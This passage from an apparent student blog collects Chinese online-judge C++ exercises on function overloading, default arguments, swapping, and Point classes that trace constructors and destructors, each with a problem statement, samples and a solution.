</code></pre>
<h3 id="4-重载函数：max"><a href="#4-重载函数：max" class="headerlink" title="4.重载函数：max"></a>4.重载函数：max</h3><blockquote>
<h2 id="Description-3"><a href="#Description-3" class="headerlink" title="Description"></a>Description</h2><p>编写两个名为max的函数，它们是重载函数 ，用于求两个整数或实数的最大值。它们的原型分别是：</p>
<p>int max(int a,int b);</p>
<p>double max(double a,double b);</p>
<p>返回值是a和b的最大值。</p>
<h2 id="Input-3"><a href="#Input-3" class="headerlink" title="Input"></a>Input</h2><p>输入4个数，前两个数是int类型的整数，后2个数是double类型的实数。</p>
<h2 id="Output-3"><a href="#Output-3" class="headerlink" title="Output"></a>Output</h2><p>输出2个数，每个数占一行。第一个数对应于输入的两个整数的最大值，第二个数对应于输入的两个实数的最大值。</p>
<h2 id="Sample-Input-3"><a href="#Sample-Input-3" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>1 2</p>
<p>1.4 1.3</p>
<h2 id="Sample-Output-3"><a href="#Sample-Output-3" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>21.4</p>
<h2 id="HINT-3"><a href="#HINT-3" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-3"><a href="#Append-Code-3" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1279&getkey=">append.cc</a>, </p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
using namespace std;
int max(int a,int b)&#123;
    int max;
    if(a &gt; b)
        max = a;
    else
        max = b;
    return max;
&#125;
double max(double a,double b)&#123;
    double max;
    if(a &gt; b)
        max = a;
    else
        max = b;
    return max;
&#125;
////////////////////
int main()
&#123;
    int a,b;
    double c,d;
    cin&gt;&gt;a&gt;&gt;b;
    cout&lt;&lt;max(a,b)&lt;&lt;endl;
    cin&gt;&gt;c&gt;&gt;d;
    cout&lt;&lt;max(c,d)&lt;&lt;endl;
    return 0;
&#125;
</code></pre>
<h3 id="5-默认参数：求圆面积"><a href="#5-默认参数：求圆面积" class="headerlink" title="5.默认参数：求圆面积"></a>5.默认参数：求圆面积</h3><blockquote>
<h2 id="Description-4"><a href="#Description-4" class="headerlink" title="Description"></a>Description</h2><p>编写一个带默认值的函数，用于求圆面积。其原型为：</p>
<p>double area(double r=1.0);</p>
<p>当调用函数时指定参数r，则求半径为r的圆的面积；否则求半径为1的圆面积。</p>
<p>其中，PI取值3.14。</p>
<h2 id="Input-4"><a href="#Input-4" class="headerlink" title="Input"></a>Input</h2><p>一个实数，是圆的半径。</p>
<h2 id="Output-4"><a href="#Output-4" class="headerlink" title="Output"></a>Output</h2><p>输出有2行。第一行是以输入数值为半径的圆面积，第二行是半径为1的圆面积。</p>
<h2 id="Sample-Input-4"><a href="#Sample-Input-4" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>19</p>
<h2 id="Sample-Output-4"><a href="#Sample-Output-4" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>1133.54</p>
<p>3.14</p>
<h2 id="HINT-4"><a href="#HINT-4" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-4"><a href="#Append-Code-4" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1280&getkey=">append.cc</a>, </p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
using namespace std;
#define PI 3.14
double area(double r = 1.0)&#123;
    return PI*r*r;
&#125; 

/////////////////////////
int main()
&#123;
    double r;
    cin&gt;&gt;r;
    cout&lt;&lt;area(r)&lt;&lt;endl;
    cout&lt;&lt;area()&lt;&lt;endl;
    return 0;
&#125;</code></pre>
<h3 id="6-求-x-y-z-2"><a href="#6-求-x-y-z-2" class="headerlink" title="6.求(x-y+z)*2"></a>6.求(x-y+z)*2</h3><blockquote>
<h2 id="Description-5"><a href="#Description-5" class="headerlink" title="Description"></a>Description</h2><p>编写一个程序，求解以下三个函数：</p>
<p>f(x,y,z)=2*(x-y+z)</p>
<p>f(x,y)  =2*(x-y)</p>
<p>f(x)    =2*(x-1)</p>
<p>函数调用格式见append.cc。</p>
<p>append.cc中已给出main()函数。</p>
<h2 id="Input-5"><a href="#Input-5" class="headerlink" title="Input"></a>Input</h2><p>输入的测试数据为多组。每组测试数据的第一个数是n（1&lt;=n&lt;=3），表示后面有n个整数。</p>
<p>当n为3时，后跟3个输入为x,y,z；</p>
<p>当n为2时，后跟2个输入为x,y；</p>
<p>当n为1时，后跟1个输入为x；</p>
<p>当n为0时，表示输入结束</p>
<p>输入的n不会有其他取值。</p>
<p>所有运算都不会超出int类型范围。</p>
<h2 id="Output-5"><a href="#Output-5" class="headerlink" title="Output"></a>Output</h2><p>每组测试数据对应一个输出。输出x-y+z的值。</p>
<h2 id="Sample-Input-5"><a href="#Sample-Input-5" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>3 121 38 452 39 111 73</p>
<h2 id="Sample-Output-5"><a href="#Sample-Output-5" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>25656144</p>
<h2 id="HINT-5"><a href="#HINT-5" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-5"><a href="#Append-Code-5" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1381&getkey=">append.cc</a>, </p>
</blockquote>
<pre><code>#include &lt;bits/stdc++.h&gt;
using namespace std;
int f(int x,int y,int z)&#123;
    return 2*(x-y+z);
&#125;
int f(int x,int y)&#123;
    return 2*(x-y);
&#125;
int f(int x)&#123;
    return 2*(x-1);
&#125;

////////////////////////
int main()
&#123;
    int n, x, y, z;
    while(cin&gt;&gt;n)
    &#123;
        if(n == 3)
        &#123;
            cin&gt;&gt;x&gt;&gt;y&gt;&gt;z;
            cout&lt;&lt;f(x, y, z)&lt;&lt;endl;
        &#125;
        if(n == 2)
        &#123;
            cin&gt;&gt;x&gt;&gt;y;
            cout&lt;&lt;f(x, y)&lt;&lt;endl;
        &#125;
        if(n == 1)
        &#123;
            cin&gt;&gt;x;
            cout&lt;&lt;f(x)&lt;&lt;endl;
        &#125;
        if(n == 0)
            break;
    &#125;
&#125;</code></pre>
<h3 id="7-编写函数：Swap-I-Append-Code"><a href="#7-编写函数：Swap-I-Append-Code" class="headerlink" title="7.编写函数：Swap (I) (Append Code)"></a>7.编写函数：Swap (I) (Append Code)</h3><blockquote>
<h2 id="Description-6"><a href="#Description-6" class="headerlink" title="Description"></a>Description</h2><p>编写用来交换两个数的函数，使得“Append Code”中的main()函数能正确运行。</p>
<p>-—————————————————————————-</p>
<p>用C实现三个函数int_swap()、dbl_swap()、SWAP()，其中SWAP()是个带参宏。</p>
<p>用C++实现两个函数，都以swap()命名。</p>
<p>以上函数的调用格式见“Append Code”。这里不给出函数原型，它们的参数请通过main()函数自行确定。</p>
<h2 id="Input-6"><a href="#Input-6" class="headerlink" title="Input"></a>Input</h2><p>输入为4行，每行2个数。</p>
<h2 id="Output-6"><a href="#Output-6" class="headerlink" title="Output"></a>Output</h2><p>输出为4行，每行2个数。每行输出的两数为每行输入的逆序。</p>
<h2 id="Sample-Input-6"><a href="#Sample-Input-6" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>12 57</p>
<p>9 -3</p>
<p>-12 4</p>
<p>3 5</p>
<h2 id="Sample-Output-6"><a href="#Sample-Output-6" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>57 12-3 94 -125 3</p>
<h2 id="HINT-6"><a href="#HINT-6" class="headerlink" title="HINT"></a>HINT</h2><p>“Append Code”中用到的头文件、全局变量或宏的定义应自行补充。</p>
<h2 id="Append-Code-6"><a href="#Append-Code-6" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=0&pid=1107&getkey=">append.c</a>, <a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1107&getkey=">append.cc</a>, </p>
</blockquote>
<pre><code>#include &lt;bits/stdc++.h&gt;
using namespace std;
int swap(int *a,int *b)&#123;
    int c;
    c = *a;
    *a = *b;
    *b = c;
&#125;
double swap(double *a,double *b)&#123;
    double c;
    c = *a;
    *a = *b;
    *b = c;

&#125;
////////////////////
int main()
&#123;
    int x1, y1;

    cin&gt;&gt;x1&gt;&gt;y1;
    swap(&amp;x1, &amp;y1);
    cout&lt;&lt;x1&lt;&lt;&quot; &quot;&lt;&lt;y1&lt;&lt;endl;

    cin&gt;&gt;x1&gt;&gt;y1;
    swap(x1, y1);
    cout&lt;&lt;x1&lt;&lt;&quot; &quot;&lt;&lt;y1&lt;&lt;endl;

    double x2, y2;

    cin&gt;&gt;x2&gt;&gt;y2;
    swap(&amp;x2, &amp;y2);
    cout&lt;&lt;x2&lt;&lt;&quot; &quot;&lt;&lt;y2&lt;&lt;endl;

    cin&gt;&gt;x2&gt;&gt;y2;
    swap(x2, y2);
    cout&lt;&lt;x2&lt;&lt;&quot; &quot;&lt;&lt;y2&lt;&lt;endl;
&#125;</code></pre>
<h3 id="8-你会定义类吗？"><a href="#8-你会定义类吗？" class="headerlink" title="8.你会定义类吗？"></a>8.你会定义类吗？</h3><blockquote>
<h2 id="Description-7"><a href="#Description-7" class="headerlink" title="Description"></a>Description</h2><p>定义一个类Demo，有构造函数、析构函数和成员函数show()，其中show()根据样例的格式输出具体属性值。该类只有一个int类型的成员。</p>
<h2 id="Input-7"><a href="#Input-7" class="headerlink" title="Input"></a>Input</h2><p>输入只有一个整数，int类型范围内。</p>
<h2 id="Output-7"><a href="#Output-7" class="headerlink" title="Output"></a>Output</h2><p>见样例。</p>
<h2 id="Sample-Input-7"><a href="#Sample-Input-7" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>-100</p>
<h2 id="Sample-Output-7"><a href="#Sample-Output-7" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>A data 10 is created!A data 0 is created!A data -100 is created!This is data 10This is data 0This is data -100A data -100 is erased!A data 0 is erased!A data 10 is erased!</p>
<h2 id="HINT-7"><a href="#HINT-7" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-7"><a href="#Append-Code-7" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="file:///D:/郝佳伟的文件/学习资料/OJ-C++/实验/1/Problem%20A_%20你会定义类吗？_files/Source%20Code.html">append.cc</a>, </p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
using namespace std;
class Demo&#123;
public:
    int a;
    Demo(int aa=0):a(aa)&#123;cout &lt;&lt; &quot;A data &quot; &lt;&lt; a &lt;&lt; &quot; is created!&quot; &lt;&lt; endl;&#125;
    ~Demo()&#123;cout &lt;&lt; &quot;A data &quot; &lt;&lt; a &lt;&lt; &quot; is erased!&quot; &lt;&lt; endl;&#125;
    void show()&#123;cout &lt;&lt; &quot;This is data &quot; &lt;&lt; a &lt;&lt; endl;&#125;
&#125;;
/////////////////////
int main()
&#123;
    Demo tmp(10), tmp2;
    int d;
    cin&gt;&gt;d;
    Demo tmp3(d);

    tmp.show();
    tmp2.show();
    tmp3.show();
    return 0;
&#125;
</code></pre>
<h3 id="9-一元二次方程类"><a href="#9-一元二次方程类" class="headerlink" title="9.一元二次方程类"></a>9.一元二次方程类</h3><blockquote>
<h2 id="Description-8"><a href="#Description-8" class="headerlink" title="Description"></a>Description</h2><p>定义一个表示一元二次方程的类Equation，该类至少具有以下3个数据成员：a、b和c，用于表示方程“a<em>x</em>x + b*x +c = 0”。同时，该类还至少具有以下两个成员函数：</p>
<p>\1. void solve()：用于求方程的根。</p>
<p>\2. void printRoot()：用于输出方程的根。</p>
<p>设定：</p>
<p>\1. 所有输入的a、b、c所生成的方程必定有个2个不同的实根。</p>
<p>\2. 输出的两个根按照从大到小的顺序输出，两个根之间用一个空格隔开，而且每个根必须且仅能保留2位小数，即使小数部分为0。</p>
<p>\3. 请根据样例和给出的main()函数定义相应的构造函数。</p>
<h2 id="Input-8"><a href="#Input-8" class="headerlink" title="Input"></a>Input</h2><p>输入有若干行，每行有3个实数，分别为方程“a<em>x</em>x + b*x + c = 0”中的系数a、b、c。</p>
<h2 id="Output-8"><a href="#Output-8" class="headerlink" title="Output"></a>Output</h2><p>按照题目要求中的设定条件2输出方程的根。</p>
<h2 id="Sample-Input-8"><a href="#Sample-Input-8" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>1 3 2</p>
<h2 id="Sample-Output-8"><a href="#Sample-Output-8" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>-1.00 -2.00</p>
<h2 id="HINT-8"><a href="#HINT-8" class="headerlink" title="HINT"></a>HINT</h2><p>可以使用fixed和setprecision()来实现输出固定小数位数的数值。</p>
<h2 id="Append-Code-8"><a href="#Append-Code-8" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="file:///D:/郝佳伟的文件/学习资料/OJ-C++/实验/1/Problem%20B_%20一元二次方程类_files/Source%20Code.html">append.cc</a>, </p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
#include &lt;iomanip&gt;
#include &lt;math.h&gt;
using namespace std;
class Equation&#123;
public:
    double a,b,c,drt,x1,x2;
    Equation(double aa,double bb,double cc):a(aa),b(bb),c(cc)&#123;&#125;
    void solve()&#123;
        drt=sqrt(b*b-4*a*c);
    &#125;
    void printRoot()&#123;
        x1=(-b+drt)/(2*a);
        x2=(-b-drt)/(2*a);
         cout &lt;&lt; setiosflags(ios::fixed) &lt;&lt; setprecision(2) &lt;&lt; x1 &lt;&lt; &quot; &quot; &lt;&lt; x2 &lt;&lt; endl; 
    &#125;
&#125;;
////////////////////////////////
int main()
&#123;
    double a, b, c;
    while (cin&gt;&gt;a&gt;&gt;b&gt;&gt;c)
    &#123;
        Equation equ(a,b,c);
        equ.solve();
        equ.printRoot();
    &#125;
    return 0;
&#125;</code></pre>
<blockquote>
<h3 id="fixed-和setprecision-的用法"><a href="#fixed-和setprecision-的用法" class="headerlink" title="fixed 和setprecision()的用法"></a>fixed 和setprecision()的用法</h3><p>使用setprecision(n)可控制输出流显示浮点数的数字个数。C++默认的流输出数值有效位是6。<br>  如果setprecision(n)与setiosflags(ios::fixed)合用，可以控制小数点右边的数字个数。setiosflags(ios::fixed)是用定点方式表示实数。<br>  如果与setiosnags(ios::scientific)合用， 可以控制指数表示法的小数位数。setiosflags(ios::scientific)是用指数方式表示实数。</p>
</blockquote>
<h3 id="10-整数的封装"><a href="#10-整数的封装" class="headerlink" title="10.整数的封装"></a>10.整数的封装</h3><blockquote>
<h2 id="Description-9"><a href="#Description-9" class="headerlink" title="Description"></a>Description</h2><p>现在，请编写一个Integer类，将整数封装起来。目前，只需要你来实现最基本的功能：</p>
<p>\1. 具有2个构造函数：</p>
<p>（1）Integer::Integer(int)：根据参数构建一个整数对象。</p>
<p>（2）Integer::Integer(char*, int)：根据给定的字符串和进制来构建一个整数对象。</p>
<p>\2. 具有一个int Integer::getValue()方法，用于返回Integer类中所封装的整数的具体数值。</p>
<h2 id="Input-9"><a href="#Input-9" class="headerlink" title="Input"></a>Input</h2><p>输入分为多行。</p>
<p>第一行是一个正整数M，表示其后面的M行为M个整数，每行一个整数。</p>
<p>第M+2行是一个正整数N，表示其后有N行。每行由利用一个空格隔开的2部分组成：前半部分是一个字符串，后半部分是该字符串所使用的进制。</p>
<p>注意：</p>
<p>\1. 所有的输入，均在int类型的表示范围内，且所有的输入均为合法输入。</p>
<p>\2. 利用0<del>9和a</del>z可最大可以表示36进制的数值。</p>
<h2 id="Output-9"><a href="#Output-9" class="headerlink" title="Output"></a>Output</h2><p>输出为M+N行，每行为一个十进制整数，且输出顺序应与输入顺序相同。</p>
<h2 id="Sample-Input-9"><a href="#Sample-Input-9" class="headerlink" title="Sample Input"></a>Sample Input</h2><p> 2999-199940111 21a 16z 36a 16</p>
<h2 id="Sample-Output-9"><a href="#Sample-Output-9" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>999-19997263510</p>
<h2 id="HINT-9"><a href="#HINT-9" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-9"><a href="#Append-Code-9" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="file:///D:/郝佳伟的文件/学习资料/OJ-C++/实验/1/Problem%20C_%20整数的封装_files/Source%20Code.html">append.cc</a>, </p>
</blockquote>
<pre><code></code></pre>
<h3 id="11-平面上的点——Point类-I"><a href="#11-平面上的点——Point类-I" class="headerlink" title="11.平面上的点——Point类 (I)"></a>11.平面上的点——Point类 (I)</h3><blockquote>
<h2 id="Description-10"><a href="#Description-10" class="headerlink" title="Description"></a>Description</h2><p>在数学上，平面直角坐标系上的点用X轴和Y轴上的两个坐标值唯一确定。现在我们封装一个“Point类”来实现平面上的点的操作。</p>
<p>根据“append.cc”，完成Point类的构造方法和show()方法。</p>
<p>接口描述：<br> Point::show()方法：按输出格式输出Point对象。</p>
<h2 id="Input-10"><a href="#Input-10" class="headerlink" title="Input"></a>Input</h2><p>输入多行，每行为一组坐标“x,y”，表示点的x坐标和y坐标，x和y的值都在double数据范围内。</p>
<h2 id="Output-10"><a href="#Output-10" class="headerlink" title="Output"></a>Output</h2><p>输出为多行，每行为一个点，X坐标在前，Y坐标在后，Y坐标前面多输出一个空格。每个坐标的输出精度为最长16位。输出格式见sample。</p>
<p>C语言的输入输出被禁用。</p>
<h2 id="Sample-Input-10"><a href="#Sample-Input-10" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>1,23,32,1</p>
<h2 id="Sample-Output-10"><a href="#Sample-Output-10" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Point : (1, 2)Point : (3, 3)Point : (2, 1)Point : (0, 0)</p>
<h2 id="HINT-10"><a href="#HINT-10" class="headerlink" title="HINT"></a>HINT</h2><p>注意精度控制，C语言的输入输出被禁用。</p>
<h2 id="Append-Code-10"><a href="#Append-Code-10" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1121&getkey=">append.cc</a>, </p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
using namespace std;
class Point&#123;
public:
    double x,y;
    Point():x(0),y(0)&#123;&#125;
    Point(double xx,double yy):x(xx),y(yy)&#123;&#125;
    void show()&#123;cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt; &quot;)&quot; &lt;&lt; endl;&#125;
&#125;;
//////////////////////
int main()
&#123;
    char c;
    double a, b;
    Point q;
    while(std::cin&gt;&gt;a&gt;&gt;c&gt;&gt;b)
    &#123;
        Point p(a, b);
        p.show();
    &#125;
    q.show();
&#125;</code></pre>
<h3 id="12-平面上的点——Point类-II"><a href="#12-平面上的点——Point类-II" class="headerlink" title="12.平面上的点——Point类 (II)"></a>12.平面上的点——Point类 (II)</h3><blockquote>
<h2 id="Description-11"><a href="#Description-11" class="headerlink" title="Description"></a>Description</h2><p>在数学上，平面直角坐标系上的点用X轴和Y轴上的两个坐标值唯一确定。现在我们封装一个“Point类”来实现平面上的点的操作。</p>
<p>根据“append.cc”，完成Point类的构造方法和show()方法，输出各Point对象的构造和析构次序。</p>
<p>接口描述：<br> Point::show()方法：按输出格式输出Point对象。</p>
<h2 id="Input-11"><a href="#Input-11" class="headerlink" title="Input"></a>Input</h2><p>输入多行，每行为一组坐标“x,y”，表示点的x坐标和y坐标，x和y的值都在double数据范围内。</p>
<h2 id="Output-11"><a href="#Output-11" class="headerlink" title="Output"></a>Output</h2><p>输出每个Point对象的构造和析构行为。对每个Point对象，调用show()方法输出其值：X坐标在前，Y坐标在后，Y坐标前面多输出一个空格。每个坐标的输出精度为最长16位。输出格式见sample。</p>
<p>C语言的输入输出被禁用。</p>
<h2 id="Sample-Input-11"><a href="#Sample-Input-11" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>1,2</p>
<p>3,3</p>
<p>2,1</p>
<h2 id="Sample-Output-11"><a href="#Sample-Output-11" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Point : (0, 0) is created.Point : (1, 2) is created.Point : (1, 2)Point : (1, 2) is erased.Point : (3, 3) is created.Point : (3, 3)Point : (3, 3) is erased.Point : (2, 1) is created.Point : (2, 1)Point : (2, 1) is erased.Point : (0, 0) is copied.Point : (1, 1) is created.Point : (0, 0)Point : (1, 1)Point : (0, 0)Point : (1, 1) is erased.Point : (0, 0) is erased.Point : (0, 0) is erased.</p>
<h2 id="HINT-11"><a href="#HINT-11" class="headerlink" title="HINT"></a>HINT</h2><p>思考构造函数、拷贝构造函数、析构函数的调用时机。</p>
<h2 id="Append-Code-11"><a href="#Append-Code-11" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1122&getkey=">append.cc</a>, </p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
using namespace std;
class Point&#123;
public:
    double x,y;
    Point():x(0),y(0)&#123;cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt; &quot;) is created.&quot; &lt;&lt; endl;&#125;
    Point(double xx,double yy):x(xx),y(yy)&#123;cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt; &quot;) is created.&quot; &lt;&lt; endl;&#125;
    Point(const Point&amp; p):x(p.x),y(p.y)&#123;cout &lt;&lt; &quot;Point : (0, 0) is copied.&quot; &lt;&lt; endl;&#125;
    Point(double xx):x(xx),y(xx)&#123;cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt; &quot;) is created.&quot; &lt;&lt; endl;&#125;
    ~Point()&#123;cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt; &quot;) is erased.&quot; &lt;&lt; endl;&#125;
    void show()&#123;cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt; &quot;)&quot; &lt;&lt; endl;&#125;
&#125;;
//////////////////////////
int main()
&#123;
    char c;
    double a, b;
    Point q;
    while(std::cin&gt;&gt;a&gt;&gt;c&gt;&gt;b)
    &#123;
        Point p(a, b);
        p.show();
    &#125;
    Point q1(q), q2(1);
    q1.show();
    q2.show();
    q.show();
&#125;</code></pre>
<h3 id="13-平面上的点——Point类-III"><a href="#13-平面上的点——Point类-III" class="headerlink" title="13.平面上的点——Point类 (III)"></a>13.平面上的点——Point类 (III)</h3><blockquote>
<h2 id="Description-12"><a href="#Description-12" class="headerlink" title="Description"></a>Description</h2><p>在数学上，平面直角坐标系上的点用X轴和Y轴上的两个坐标值唯一确定。现在我们封装一个“Point类”来实现平面上的点的操作。</p>
<p>根据“append.cc”，完成Point类的构造方法和show()方法，输出各Point对象的构造和析构次序。实现showPoint()函数。</p>
<p>接口描述：<br> showPoint()函数按输出格式输出Point对象，调用Point::show()方法实现。<br> Point::show()方法：按输出格式输出Point对象。</p>
<h2 id="Input-12"><a href="#Input-12" class="headerlink" title="Input"></a>Input</h2><p>输入多行，每行为一组坐标“x,y”，表示点的x坐标和y坐标，x和y的值都在double数据范围内。</p>
<h2 id="Output-12"><a href="#Output-12" class="headerlink" title="Output"></a>Output</h2><p>输出每个Point对象的构造和析构行为。showPoint()函数用来输出（通过参数传入的）Point对象的值：X坐标在前，Y坐标在后，Y坐标前面多输出一个空格。每个坐标的输出精度为最长16位。输出格式见sample。</p>
<p>C语言的输入输出被禁用。</p>
<h2 id="Sample-Input-12"><a href="#Sample-Input-12" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>1,2</p>
<p>3,3</p>
<p>2,1</p>
<h2 id="Sample-Output-12"><a href="#Sample-Output-12" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Point : (0, 0) is created.</p>
<p>Point : (1, 2) is created.</p>
<p>Point : (1, 2) is copied.</p>
<p>Point : (1, 2)</p>
<p>Point : (1, 2) is erased.</p>
<p>Point : (1, 2) is erased.</p>
<p>Point : (3, 3) is created.</p>
<p>Point : (3, 3) is copied.</p>
<p>Point : (3, 3)</p>
<p>Point : (3, 3) is erased.</p>
<p>Point : (3, 3) is erased.</p>
<p>Point : (2, 1) is created.</p>
<p>Point : (2, 1) is copied.</p>
<p>Point : (2, 1)</p>
<p>Point : (2, 1) is erased.</p>
<p>Point : (2, 1) is erased.</p>
<p>Point : (0, 0) is copied.</p>
<p>Point : (1, 1) is created.</p>
<p>Point : (0, 0) is copied.</p>
<p>Point : (1, 1) is copied.</p>
<p>Point : (0, 0) is copied.</p>
<p>Point : (0, 0)</p>
<p>Point : (1, 1)</p>
<p>Point : (0, 0)</p>
<p>Point : (0, 0) is erased.</p>
<p>Point : (1, 1) is erased.</p>
<p>Point : (0, 0) is erased.</p>
<p>Point : (1, 1) is erased.</p>
<p>Point : (0, 0) is erased.</p>
<p>Point : (0, 0) is erased.</p>
<h2 id="HINT-12"><a href="#HINT-12" class="headerlink" title="HINT"></a>HINT</h2><p>思考构造函数、拷贝构造函数、析构函数的调用时机。</p>
<h2 id="Append-Code-12"><a href="#Append-Code-12" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1123&getkey=">append.cc</a>, </p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
using namespace std;
class Point&#123;
public:
    double x,y;
    Point():x(0),y(0)&#123;cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt; &quot;) is created.&quot; &lt;&lt; endl;&#125;
    Point(double xx,double yy):x(xx),y(yy)&#123;cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt; &quot;) is created.&quot; &lt;&lt; endl;&#125;
    Point(const Point&amp; p):x(p.x),y(p.y)&#123;cout &lt;&lt; &quot;Point : (0, 0) is copied.&quot; &lt;&lt; endl;&#125;
    Point(double xx):x(xx),y(xx)&#123;cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt; &quot;) is created.&quot; &lt;&lt; endl;&#125;
    ~Point()&#123;cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt; &quot;) is erased.&quot; &lt;&lt; endl;&#125;
    void show()&#123;cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt; &quot;)&quot; &lt;&lt; endl;&#125;
&#125;;
void showPoint(Point s)&#123;s.show();&#125;
void showPoint(Point a,Point b,Point c)&#123;a.show();b.show();c.show();&#125;
////////////////////////////////
int main()
&#123;
    char c;
    double a, b;
    Point q;
    while(std::cin&gt;&gt;a&gt;&gt;c&gt;&gt;b)
    &#123;
        Point p(a, b);
        showPoint(p);
    &#125;
    Point q1(q), q2(1);
    showPoint(q1, q2, q);
&#125;</code></pre>
<h3 id="14-平面上的点——Point类-IV"><a href="#14-平面上的点——Point类-IV" class="headerlink" title="14.平面上的点——Point类 (IV)"></a>14.平面上的点——Point类 (IV)</h3><blockquote>
<h2 id="Description-13"><a href="#Description-13" class="headerlink" title="Description"></a>Description</h2><p>在数学上，平面直角坐标系上的点用X轴和Y轴上的两个坐标值唯一确定。现在我们封装一个“Point类”来实现平面上的点的操作。<br> 根据“append.cc”，完成Point类的构造方法和show()、showCounter()、showSumOfPoint()方法；实现showPoint()函数。<br> 接口描述：<br> showPoint()函数：按输出格式输出Point对象，调用Point::show()方法实现。<br> Point::show()方法：按输出格式输出Point对象。<br> Point::showCounter()方法：按格式输出当前程序中Point对象的计数。<br> Point::showSumOfPoint()方法：按格式输出程序运行至当前存在过的Point对象总数。</p>
<h2 id="Input-13"><a href="#Input-13" class="headerlink" title="Input"></a>Input</h2><p>输入多行，每行为一组坐标“x,y”，表示点的x坐标和y坐标，x和y的值都在double数据范围内。</p>
<h2 id="Output-13"><a href="#Output-13" class="headerlink" title="Output"></a>Output</h2><p>对每个Point对象，调用show()方法输出其值，或者用showPoint()函数来输出（通过参数传入的）Point对象的值：X坐标在前，Y坐标在后，Y坐标前面多输出一个空格。每个坐标的输出精度为最长16位。调用用showCounter()方法和showSumOfPoint()输出Point对象的计数统计，输出格式见sample。<br> C语言的输入输出被禁用。</p>
<h2 id="Sample-Input-13"><a href="#Sample-Input-13" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>1,2</p>
<p>3,3</p>
<p>2,1</p>
<h2 id="Sample-Output-13"><a href="#Sample-Output-13" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Point : (1, 2)</p>
<p>Current : 2 points.</p>
<p>Point : (3, 3)</p>
<p>Current : 2 points.</p>
<p>Point : (2, 1)</p>
<p>Current : 2 points.</p>
<p>In total : 4 points.</p>
<p>Current : 3 points.</p>
<p>Point : (0, 0)</p>
<p>Point : (1, 1)</p>
<p>Point : (0, 0)</p>
<p>In total : 6 points.</p>
<h2 id="HINT-13"><a href="#HINT-13" class="headerlink" title="HINT"></a>HINT</h2><p>对象计数通过静态成员来实现</p>
<h2 id="Append-Code-13"><a href="#Append-Code-13" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1124&getkey=">append.cc</a>, </p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
using namespace std;
class Point&#123;  
private:  
    double x,y;  
    static int sum,num;  
public:  
    Point():x(0),y(0)&#123;num++;sum++;&#125;  
    Point(double a):x(a),y(1)&#123;num++;sum++;&#125;  
